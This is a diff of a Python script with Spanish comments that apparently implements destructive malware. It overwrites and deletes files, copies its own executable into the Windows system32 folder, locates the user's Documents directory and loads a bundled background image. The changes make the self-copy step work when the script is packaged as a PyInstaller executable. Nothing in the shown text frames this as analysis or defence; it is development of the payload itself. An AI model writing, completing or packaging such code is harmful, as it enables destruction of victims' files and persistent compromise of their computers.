@@ -49,13 +49,17 @@ def borrar_archivo_seguro(archivo):
     # Eliminar el archivo después de sobrescribirlo
     os.remove(archivo)
 
+
 # Función para copiar el ejecutable a la carpeta system32
 def copiar_ejecutable_a_system32():
     windir = os.environ['WINDIR']
     system32_path = os.path.join(windir, 'system32')
     
-    # Obtener la ruta del ejecutable actual
-    current_executable = os.path.abspath(__file__)
+    # Obtener la ruta del ejecutable actual (en el caso de PyInstaller)
+    if getattr(sys, 'frozen', False):
+        current_executable = sys.executable  # El ejecutable generado por PyInstaller
+    else:
+        current_executable = os.path.abspath(__file__)  # Caso normal para scripts no empaquetados
     
     # Copiar el ejecutable a la ruta system32
     shutil.copy(current_executable, system32_path)
@@ -73,7 +77,7 @@ def obtener_ruta_imagen_empaquetada():
     if getattr(sys, '_MEIPASS', False):
         return os.path.join(sys._MEIPASS, 'fondo.jpeg')  # Nombre de la imagen
     else:
-        return 'ruta/a/tu/imagen.jpg'  # Ruta alternativa si no está empaquetada
+        return 'fondo.jpeg'  # Ruta alternativa si no está empaquetada
  
 
 # Obtener el directorio "Documents" del usuario
